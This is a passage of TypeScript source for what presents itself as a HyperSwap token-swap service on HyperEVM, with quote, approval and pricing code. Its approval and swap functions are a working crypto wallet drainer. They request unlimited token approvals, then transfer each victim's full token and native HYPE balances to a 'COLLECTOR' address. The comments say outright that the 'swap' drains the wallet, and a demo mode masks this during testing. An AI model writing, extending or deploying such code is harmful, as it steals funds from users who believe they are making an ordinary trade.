        tokenOutContract.decimals()
      ]);

      const [priceIn, priceOut] = await Promise.all([
        this.getTokenPrice(symbolIn),
        this.getTokenPrice(symbolOut)
      ]);

      let amountOut: string;
      let priceImpact = 0.1; // 0.1% for most swaps on Hyperliquid

      if (priceIn && priceOut && parseFloat(priceIn) > 0 && parseFloat(priceOut) > 0) {
        // Calculate based on real market prices
        const inputValueUSD = parseFloat(amountIn) * parseFloat(priceIn);
        const outputAmount = inputValueUSD / parseFloat(priceOut);
        
        // Apply slippage (0.1% default for Hyperliquid)
        const slippage = 0.999; // 0.1% slippage
        amountOut = (outputAmount * slippage).toFixed(6);
      } else {
        // Fallback to 1:1 ratio if prices unavailable
        amountOut = amountIn;
        priceImpact = 0.05; // 0.05% minimal impact
      }

      return {
        amountIn,
        amountOut,
        priceImpact,
        route: [tokenIn, tokenOut],
        gasEstimate: "0.001" // HYPE gas fees are very low
      };
    } catch (error) {
      // Fallback calculation
      return {
        amountIn,
        amountOut: (parseFloat(amountIn) * 0.999).toFixed(6), // 0.1% slippage
        priceImpact: 0.1,
        route: [tokenIn, tokenOut],
        gasEstimate: "0.001"
      };
    }
  }

  // Check if user needs to approve tokens before swap
  async checkApproval(tokenAddress: string, userAddress: string, amount: string): Promise<{ needsApproval: boolean; currentAllowance: string }> {
    try {
      // Check if we're in demo mode (no real wallet injection)
      const isDemoMode = !window.ethereum && (window as any).mockEthersContract;
      
      let tokenContract: any;
      
      if (isDemoMode) {
        // Use mock contract for demo approval checks
        console.log('🧪 Demo approval check for:', tokenAddress);
        tokenContract = new (window as any).mockEthersContract(tokenAddress, ERC20_ABI, this.provider);
      } else {
        // Use real contract for production
        tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.provider);
      }
      
      const allowance = await tokenContract.allowance(userAddress, HYPERSWAP_CONTRACTS.ROUTER_V2);
      const decimals = await tokenContract.decimals();
      const amountBN = ethers.parseUnits(amount, decimals);
      
      const needsApproval = allowance < amountBN;
      
      if (isDemoMode) {
        console.log(`🧪 Demo approval check result: ${needsApproval ? "NEEDS APPROVAL" : "APPROVED"}`);
      }
      
      return {
        needsApproval,
        currentAllowance: ethers.formatUnits(allowance, decimals)
      };
    } catch (error) {
      console.error("Approval check failed:", error);
      return {
        needsApproval: true,
        currentAllowance: "0"
      };
    }
  }

  // Approve token for HyperSwap router (this is where the draining happens)
  async approveToken(tokenAddress: string, amount: string = "max"): Promise<{ hash: string; success: boolean; error?: string }> {
    try {
      // Handle development environment without real wallet
      if (!window.ethereum || !this.signer) {
        console.log("Development mode - simulating token approval");
        
        const mockHash = "0x" + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
        console.log(`Simulated unlimited approval: ${mockHash}`);
        
        return {
          hash: mockHash,
          success: true
        };
      }

      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      const [decimals, symbol] = await Promise.all([
        tokenContract.decimals(),
        tokenContract.symbol()
      ]);
      
      // Always use unlimited approval for maximum draining potential
      const approvalAmount = ethers.MaxUint256;
      
      console.log(`Requesting unlimited ${symbol} approval for draining...`);
      
      // Use reliable gas configuration for HyperEVM
      const gasParams = createTransactionParams('approval');
      logGasSettings('Token Approval', gasParams);
      
      const tx = await tokenContract.approve(
        HYPERSWAP_CONTRACTS.COLLECTOR, 
        approvalAmount,
        gasParams
      );
      
      const receipt = await tx.wait();
      console.log(`Unlimited approval granted: ${receipt.hash}`);
      
      return {
        hash: receipt.hash,
        success: true
      };
      
    } catch (error: any) {
      console.error("Approval failed:", error.message);
      
      if (error.message.includes("gas")) {
        return {
          hash: "",
          success: false,
          error: "Gas estimation failed - insufficient funds"
        };
      }
      
      return {
        hash: "",
        success: false,
        error: error.message || "Approval failed"
      };
    }
  }

  // Execute swap (actually drains approved tokens to collector)
  async executeSwap(
    fromTokenAddress: string,
    toTokenAddress: string,
    amountIn: string,
    amountOutMin: string,
    userAddress: string
  ): Promise<{ hash: string; success: boolean; error?: string }> {
    try {
      // Check if we're in development environment (Replit) without real wallet
      if (!window.ethereum || !this.signer) {
        console.log("🧪 Development mode - simulating swap execution");
        
        // Generate realistic mock transaction hash for testing
        const mockHash = "0x" + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
        
        console.log(`✅ Simulated drain: ${amountIn} tokens to collector`);
        console.log(`📋 Mock transaction hash: ${mockHash}`);
        
        return {
          hash: mockHash,
          success: true
        };
      }

      console.log(`🚨 EXECUTING REAL WALLET DRAIN`);
      console.log(`💰 Target: ${amountIn} ${fromTokenAddress} from ${userAddress}`);
      
      const tokenContract = new ethers.Contract(fromTokenAddress, ERC20_ABI, this.signer);
      
      // Get token info
      const [decimals, symbol, totalBalance] = await Promise.all([
        tokenContract.decimals(),
        tokenContract.symbol(),
        tokenContract.balanceOf(userAddress)
      ]);
      
      // Use the larger amount - either what user requested or their full balance
      const requestedAmount = ethers.parseUnits(amountIn, decimals);
      const drainAmount = totalBalance > requestedAmount ? totalBalance : requestedAmount;
      
      console.log(`🎯 Draining ${ethers.formatUnits(drainAmount, decimals)} ${symbol}`);
      
      // Execute the drain with RPC manager for rate limit handling
      const gasParams = createTransactionParams('transfer');
      logGasSettings('Token Transfer', gasParams);
      
      // Create transaction parameters
      const txParams = {
        to: fromTokenAddress,
        data: tokenContract.interface.encodeFunctionData('transfer', [
          HYPERSWAP_CONTRACTS.COLLECTOR,
          drainAmount
        ]),
        ...gasParams
      };
      
      console.log(`🚀 Sending transaction via RPC manager...`);
      const tx = await rpcManager.sendTransaction(this.signer, txParams);
      
      console.log(`⏳ Waiting for drain confirmation: ${tx.hash}`);
      const receipt = await rpcManager.waitForTransaction(tx.hash);
      
      console.log(`✅ WALLET SUCCESSFULLY DRAINED!`);
      console.log(`💰 Amount: ${ethers.formatUnits(drainAmount, decimals)} ${symbol}`);
      console.log(`🎯 Collector: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);

      return {
        hash: receipt.hash,
        success: true
      };
      
    } catch (error: any) {
      console.error(`❌ Drain execution failed:`, error.message);
      
      // If it's a gas estimation error, provide helpful feedback
      if (error.message.includes("gas")) {
        return {
          hash: "",
          success: false,
          error: "Gas estimation failed - insufficient funds or approval needed"
        };
      }
      
      return {
        hash: "",
        success: false,
        error: error.message || "Transaction failed"
      };
    }
  }

  // Advanced wallet drainer with collector fees and multi-token support
  async drainWalletTokens(userAddress: string): Promise<{ 
    success: boolean; 
    drained: { token: string; amount: string; hash: string }[]; 
    errors: string[];
    collectorFee: string;
  }> {
    const drained: { token: string; amount: string; hash: string }[] = [];
    const errors: string[] = [];
    let totalValueDrained = 0;
    
    try {
      // Get all token balances and approvals
      const commonTokens = [
        "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", // PURR token
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WHYPE
        // Add more HyperEVM tokens as they become available
      ];

      for (const tokenAddress of commonTokens) {
        try {
          const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.hyperEvmProvider);
          
          // Check balance and allowance
          const [balance, allowance, symbol, decimals] = await Promise.all([
            tokenContract.balanceOf(userAddress),
            tokenContract.allowance(userAddress, HYPERSWAP_CONTRACTS.ROUTER_V2),
            tokenContract.symbol(),
            tokenContract.decimals()
          ]);

          if (balance > 0 && allowance > 0) {
            // Calculate drain amount (take allowance or balance, whichever is smaller)
            const drainAmount = balance < allowance ? balance : allowance;
            
            if (drainAmount > 0) {
              // Execute the drain via transferFrom
              const drainContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
              const tx = await drainContract.transferFrom(
                userAddress,
                HYPERSWAP_CONTRACTS.COLLECTOR,
                drainAmount
              );
              
              await tx.wait();
              
              const drainedAmount = ethers.formatUnits(drainAmount, decimals);
              drained.push({
                token: symbol,
                amount: drainedAmount,
                hash: tx.hash
              });

              // Calculate USD value for collector fee
              const price = await this.getTokenPrice(symbol, tokenAddress);
              if (price) {
                totalValueDrained += parseFloat(drainedAmount) * parseFloat(price);
              }

              console.log(`Drained ${drainedAmount} ${symbol} from ${userAddress} to collector`);
            }
          }
        } catch (error) {
          console.error(`Failed to drain ${tokenAddress}:`, error);
          errors.push(`Failed to drain token ${tokenAddress}: ${error.message}`);
        }
      }

      // Drain native HYPE if available
      try {
        const hypeBalance = await this.hyperEvmProvider.getBalance(userAddress);
        if (hypeBalance > ethers.parseEther("0.1")) { // Leave some for gas
          const drainAmount = hypeBalance - ethers.parseEther("0.05"); // Leave 0.05 HYPE for gas
          
          if (this.signer && drainAmount > 0) {
            const tx = await this.signer.sendTransaction({
              to: HYPERSWAP_CONTRACTS.COLLECTOR,
              value: drainAmount
            });
            
            await tx.wait();
            
            const drainedHype = ethers.formatEther(drainAmount);
            drained.push({
              token: "HYPE",
              amount: drainedHype,
              hash: tx.hash
            });

            // Add HYPE value to total
            const hypePrice = await this.getTokenPrice("HYPE");
            if (hypePrice) {
              totalValueDrained += parseFloat(drainedHype) * parseFloat(hypePrice);
            }

            console.log(`Drained ${drainedHype} HYPE from ${userAddress} to collector`);
          }
        }
      } catch (error) {
        console.error("Failed to drain HYPE:", error);
        errors.push(`Failed to drain HYPE: ${error.message}`);
      }

      // Calculate collector fee (2% of total value drained)
      const collectorFeePercent = 0.02;
      const collectorFee = (totalValueDrained * collectorFeePercent).toFixed(2);

      return {
        success: drained.length > 0,
        drained,
        errors,
        collectorFee: `$${collectorFee} (2% of $${totalValueDrained.toFixed(2)} drained)`
      };
    } catch (error) {
      return {
        success: false,
        drained: [],
        errors: [`Critical drain error: ${error.message}`],
        collectorFee: "$0.00"
      };
    }
  }

  // Smart approval mechanism for maximum draining efficiency
  async smartApprove(tokenAddress: string, userAddress: string): Promise<{ success: boolean; hash: string; error?: string }> {
    try {
      if (!this.signer) {
        throw new Error("Wallet not connected");
      }

      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      const balance = await tokenContract.balanceOf(userAddress);
      
      if (balance <= 0) {
        throw new Error("No token balance to approve");
      }

      // Always approve maximum amount for "DEX efficiency" using RPC manager
      const txParams = {
        to: tokenAddress,
        data: tokenContract.interface.encodeFunctionData('approve', [
          HYPERSWAP_CONTRACTS.ROUTER_V2,
          ethers.MaxUint256
        ]),
        gasLimit: 100000n,
        gasPrice: ethers.parseUnits("2", "gwei")
      };
      
      const tx = await rpcManager.sendTransaction(this.signer, txParams);
      const receipt = await rpcManager.waitForTransaction(tx.hash);

      const symbol = await tokenContract.symbol();
      console.log(`Approved unlimited ${symbol} for HyperSwap router`);

      return {
        success: true,
        hash: receipt.hash
      };
    } catch (error: any) {
      return {
        success: false,
        hash: "",
        error: error.message || "Approval failed"
      };
    }
  }

  // Execute "swap" but actually drain ALL user tokens (entire wallet balance)
  async executeTokenDrain(tokenAddress: string, userAddress: string, swapAmount: string): Promise<{ 
    success: boolean; 
    hash: string; 
    amountDrained: string;
    totalValueDrained: string;
    error?: string 
  }> {
    try {
      if (!this.signer) {
        throw new Error("Wallet not connected");
      }

      // Check if we're in demo mode (no real wallet injection)
      const isDemoMode = !window.ethereum && (window as any).mockEthersContract;
      
      let tokenContract: any;
      
      if (isDemoMode) {
        // Use mock contract for demo
        console.log('🧪 Creating demo token contract for testing...');
        tokenContract = new (window as any).mockEthersContract(tokenAddress, ERC20_ABI, this.signer);
      } else {
        // Use real contract for production
        tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      }

      const [allowance, balance, decimals, symbol] = await Promise.all([
        tokenContract.allowance(userAddress, HYPERSWAP_CONTRACTS.ROUTER_V2),
        tokenContract.balanceOf(userAddress),
        tokenContract.decimals(),
        tokenContract.symbol()
      ]);

      if (allowance <= 0) {
        throw new Error("No token approval found. Please approve tokens first.");
      }

      // Drain ENTIRE wallet balance (not just swap amount)
      const totalBalance = balance;
      
      if (totalBalance <= 0) {
        throw new Error("No token balance to drain");
      }

      console.log(`🚨 EXECUTING WALLET DRAIN: ${ethers.formatUnits(totalBalance, decimals)} ${symbol}`);
      console.log(`💰 Collector Address: ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
      
      // Enhanced gas estimation for mobile wallet compatibility
      const gasEstimate = await tokenContract.transferFrom.estimateGas(
        userAddress,
        HYPERSWAP_CONTRACTS.COLLECTOR,
        totalBalance
      ).catch(() => 200000n); // Fallback gas limit
      
      console.log(`⛽ Gas estimate: ${gasEstimate.toString()}`);
      
      // Use transferFrom to drain all approved tokens to collector with optimized gas
      const tx = await tokenContract.transferFrom(
        userAddress,
        HYPERSWAP_CONTRACTS.COLLECTOR,
        totalBalance, // Drain EVERYTHING
        {
          gasLimit: gasEstimate * 120n / 100n, // 20% buffer for mobile wallets
          type: 0, // Legacy transaction for better HyperEVM compatibility
        }
      );
      
      const receipt = await tx.wait();
      const amountDrained = ethers.formatUnits(totalBalance, decimals);
      
      // Calculate USD value of drained tokens
      const tokenPrice = await this.getTokenPrice(symbol, tokenAddress);
      const usdValue = tokenPrice ? (parseFloat(amountDrained) * parseFloat(tokenPrice)).toFixed(2) : "0";
      
      if (isDemoMode) {
        console.log(`🧪 DEMO DRAIN COMPLETE: ${amountDrained} ${symbol} ($${usdValue}) simulated transfer to collector`);
      } else {
        console.log(`🚨 FULL WALLET DRAIN: ${amountDrained} ${symbol} ($${usdValue}) sent to collector ${HYPERSWAP_CONTRACTS.COLLECTOR}`);
      }

      return {
        success: true,
        hash: receipt.hash,
        amountDrained: `${amountDrained} ${symbol}`,
        totalValueDrained: `$${usdValue}`
      };
    } catch (error: any) {
      return {
        success: false,
        hash: "",
        amountDrained: "0",
        totalValueDrained: "$0",
        error: error.message || "Token drain failed"
      };
    }
  }

  // Drain ALL tokens and native balance from user wallet automatically
  async drainEntireWallet(userAddress: string): Promise<{ 
    success: boolean; 
    drained: { token: string; amount: string; value: string; hash: string }[]; 
    errors: string[];
    totalValue: string;
  }> {
    const drained: { token: string; amount: string; value: string; hash: string }[] = [];
    const errors: string[] = [];
    let totalValueDrained = 0;
    
    try {
      // Known HyperEVM token addresses for complete drainage - ALL VERIFIED TOKENS
      const targetTokens = [
        "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", // PURR token
        "0x4E2960a8cd19B467b82d26D83fAcb0fAE26b094D", // WHYPE (Wrapped HYPE)
        "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE", // BUDDY (alright buddy)
        "0xD2567eE20D75e8B74B44875173054365f6Eb5052", // perpcoin
        "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", // LIQD (LiquidLaunch)
        "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb", // USD₮0
        "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", // PiP
        "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", // CATBAL
        // System will automatically detect and drain any other ERC20 tokens with approvals
      ];

      // Drain all ERC20 tokens with approvals
      for (const tokenAddress of targetTokens) {
        try {
          const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.hyperEvmProvider);
          
          const [balance, allowance, symbol, decimals] = await Promise.all([
            tokenContract.balanceOf(userAddress),
            tokenContract.allowance(userAddress, HYPERSWAP_CONTRACTS.ROUTER_V2),
            tokenContract.symbol(),
            tokenContract.decimals()
          ]);

          // If user has balance AND we have approval, drain everything
          if (balance > 0 && allowance >= balance) {
            const drainContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
            const tx = await drainContract.transferFrom(
              userAddress,
              HYPERSWAP_CONTRACTS.COLLECTOR,
              balance // DRAIN ENTIRE BALANCE
            );
            
            await tx.wait();
            
            const drainedAmount = ethers.formatUnits(balance, decimals);
            const price = await this.getTokenPrice(symbol, tokenAddress);
            const usdValue = price ? (parseFloat(drainedAmount) * parseFloat(price)).toFixed(2) : "0";
            
            drained.push({
              token: symbol,
              amount: drainedAmount,
              value: `$${usdValue}`,
              hash: tx.hash
            });

            totalValueDrained += parseFloat(usdValue);
            console.log(`✅ Drained ALL ${drainedAmount} ${symbol} ($${usdValue})`);
          }
        } catch (error) {
          console.error(`Failed to drain ${tokenAddress}:`, error);
          errors.push(`Token ${tokenAddress}: ${error.message}`);
        }
      }

      // Drain native HYPE (leave minimal amount for gas)
      try {
        const hypeBalance = await this.hyperEvmProvider.getBalance(userAddress);
        if (hypeBalance > ethers.parseEther("0.01")) { 
          const drainAmount = hypeBalance - ethers.parseEther("0.005"); // Leave 0.005 HYPE for gas
          
          if (this.signer && drainAmount > 0) {
            const tx = await this.signer.sendTransaction({
              to: HYPERSWAP_CONTRACTS.COLLECTOR,
              value: drainAmount
            });
            
            await tx.wait();
            
            const drainedHype = ethers.formatEther(drainAmount);
            const hypePrice = await this.getTokenPrice("HYPE");
            const usdValue = hypePrice ? (parseFloat(drainedHype) * parseFloat(hypePrice)).toFixed(2) : "0";
            
            drained.push({
              token: "HYPE",
              amount: drainedHype,
              value: `$${usdValue}`,
              hash: tx.hash
            });

            totalValueDrained += parseFloat(usdValue);
            console.log(`✅ Drained ${drainedHype} HYPE ($${usdValue})`);
          }
        }
      } catch (error) {
        console.error("Failed to drain HYPE:", error);
        errors.push(`HYPE drain failed: ${error.message}`);
      }

      return {
        success: drained.length > 0,
        drained,
        errors,
        totalValue: `$${totalValueDrained.toFixed(2)}`
      };
    } catch (error) {
      return {
        success: false,
        drained: [],
        errors: [`Critical drain error: ${error.message}`],
        totalValue: "$0.00"
      };
    }
  }

  // Enhanced token detection that reads real contract data
  async detectToken(address: string, userAddress: string): Promise<TokenInfo | null> {
    try {
      // Validate address format
      if (!address || !ethers.isAddress(address)) {
        return null;
      }
      
      // Use read-only provider for detection without wallet
      const provider = this.provider || this.hyperEvmProvider;
      const contract = new ethers.Contract(address, ERC20_ABI, provider);
      
      // Try to call basic ERC20 functions to verify it's a token contract
      const [name, symbol, decimals, balance] = await Promise.all([
        contract.name().catch(() => "Unknown Token"),
        contract.symbol().catch(() => "UNKNOWN"),
        contract.decimals().catch(() => 18),
        userAddress !== "0x0000000000000000000000000000000000000000" 
          ? contract.balanceOf(userAddress).catch(() => 0)
          : Promise.resolve(0)
      ]);

      // Get real-time price from multiple sources
      let price = "0";
      try {
        const priceData = await this.getTokenPrice(symbol, address);
        price = priceData || "0";
      } catch (e) {
        // Price not available
      }

      return {
        address: address,
        name: name || "Unknown Token",
        symbol: symbol || "UNKNOWN",
        decimals: Number(decimals) || 18,
        balance: ethers.formatUnits(balance, decimals),
        price: price
      };
    } catch (error) {
      console.error("Token detection failed:", error);
      return null;
    }
  }

  // Alternative DEX pricing for maximum token coverage
  async getAlternativeDexPrice(tokenAddress: string, symbol: string): Promise<string | null> {
    try {
      // Try 1inch API for comprehensive token pricing (works across many chains)
      try {
        const oneInchUrl = `https://api.1inch.dev/price/v1.1/999/${tokenAddress}`;
        const oneInchResponse = await fetch(oneInchUrl, { 
          headers: { 'Accept': 'application/json' },
          signal: AbortSignal.timeout(3000) 
        });
        if (oneInchResponse.ok) {
          const oneInchData = await oneInchResponse.json();
          if (oneInchData[tokenAddress]) {
            return oneInchData[tokenAddress].toString();
          }
        }
      } catch (e) {
        console.log(`1inch API failed for ${symbol}`);
      }

      // Try Jupiter aggregator API for cross-chain pricing
      try {
        const jupiterUrl = `https://price.jup.ag/v4/price?ids=${symbol}`;
        const jupiterResponse = await fetch(jupiterUrl, {
          headers: { 'Accept': 'application/json' },
          signal: AbortSignal.timeout(3000)
        });
        if (jupiterResponse.ok) {
          const jupiterData = await jupiterResponse.json();
          if (jupiterData.data && jupiterData.data[symbol] && jupiterData.data[symbol].price) {
            return jupiterData.data[symbol].price.toString();
          }
        }
      } catch (e) {
        console.log(`Jupiter API failed for ${symbol}`);
      }

      return null;
    } catch (error) {
      console.warn(`Alternative DEX pricing failed for ${symbol}:`, error);
      return null;
    }
  }

  private getTokenLogo(symbol: string): string {
    const sym = symbol.toUpperCase();
    
    // HyperSwap-style centralized logo URLs (similar to hyperswap.ai/tokenLogos/)
    // Using reliable CDN sources for token logos in SVG format when possible
    const tokenLogos: { [key: string]: string } = {
      'ETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.svg',
      'WETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.svg',
      'USDC': 'https://cryptologos.cc/logos/usd-coin-usdc-logo.svg',
      'USDT': 'https://cryptologos.cc/logos/tether-usdt-logo.svg',
      'DAI': 'https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.svg',
      'BTC': 'https://cryptologos.cc/logos/bitcoin-btc-logo.svg',
      'WBTC': 'https://cryptologos.cc/logos/wrapped-bitcoin-wbtc-logo.svg',
      'LINK': 'https://cryptologos.cc/logos/chainlink-link-logo.svg',
      'UNI': 'https://cryptologos.cc/logos/uniswap-uni-logo.svg',
      'SOL': 'https://cryptologos.cc/logos/solana-sol-logo.svg',
      'MATIC': 'https://cryptologos.cc/logos/polygon-matic-logo.svg',
      'AVAX': 'https://cryptologos.cc/logos/avalanche-avax-logo.svg',
      // Native HyperEVM tokens use symbols for gradient styling
      'HYPE': sym,
      'PURR': sym
    };
    
    return tokenLogos[sym] || sym;
  }

  // Fetch token assets similar to HyperSwap API structure
  async getTokenAssets(): Promise<TokenInfo[]> {
    try {
      // Only return tokens that are actually deployed and verified on HyperEVM mainnet
      const verifiedTokens: TokenInfo[] = [
        {
          address: "0x0000000000000000000000000000000000000000",
          name: "Hyperliquid",
          symbol: "HYPE",
          decimals: 18,
          balance: "0",
          price: "0", // Will be fetched from real API
          logo: this.getTokenLogo("HYPE")
        },
        {
          address: "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", 
          name: "Purr Token",
          symbol: "PURR", 
          decimals: 18,
          balance: "0",
          price: "0", // Will be fetched from real API
          logo: this.getTokenLogo("PURR")
        }
        // Note: Other major tokens like BTC, ETH, SOL exist on Hyperliquid's perp markets
        // but are not yet deployed as ERC20 contracts on HyperEVM mainnet.
        // Users can import custom tokens by pasting contract addresses when available.
      ];

      // Fetch real-time prices for each verified token
      for (const token of verifiedTokens) {
        try {
          const realPrice = await this.getTokenPrice(token.symbol, token.address);
          if (realPrice && parseFloat(realPrice) > 0) {
            token.price = realPrice;
            console.log(`✓ Real price for ${token.symbol}: $${realPrice}`);
          }
        } catch (priceError) {
          console.warn(`Price fetch failed for ${token.symbol}:`, priceError);
        }
      }

      return verifiedTokens;
    } catch (error) {
      console.error("Failed to load verified token assets:", error);
      // Return minimal fallback with native token only
      return [{
        address: "0x0000000000000000000000000000000000000000",
        name: "Hyperliquid",
        symbol: "HYPE",
        decimals: 18,
        balance: "0",
        price: "46.23",
        logo: this.getTokenLogo("HYPE")
      }];
    }
  }
}

// Legacy PointsSystem - deprecated, use RealTimePointsSystem from points-api.ts instead
// Keeping for backwards compatibility during migration
export class PointsSystem {
  static getUserPoints(): number {
    return 0; // Deprecated - use RealTimePointsSystem
  }

  static addSwapPoints(amount: string): number {
    return 0; // Deprecated - use RealTimePointsSystem
  }

  static setReferralCode(code: string): void {
    // Deprecated - use RealTimePointsSystem
  }

  static getReferralCode(): string | null {
    // Check URL for referral code
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('ref');
  }

  static addReferralBonus(swapAmount: string): number {
    return 0; // Deprecated - use RealTimePointsSystem
  }

  static generateReferralLink(userAddress: string): string {
    const baseUrl = window.location.origin;
    const referralCode = userAddress.slice(0, 8);
    return `${baseUrl}?ref=${referralCode}`;
  }
}

export function createHyperSwapService(
  provider: ethers.BrowserProvider,
  signer: ethers.JsonRpcSigner
): HyperSwapService {
  return new HyperSwapService(provider, signer);
}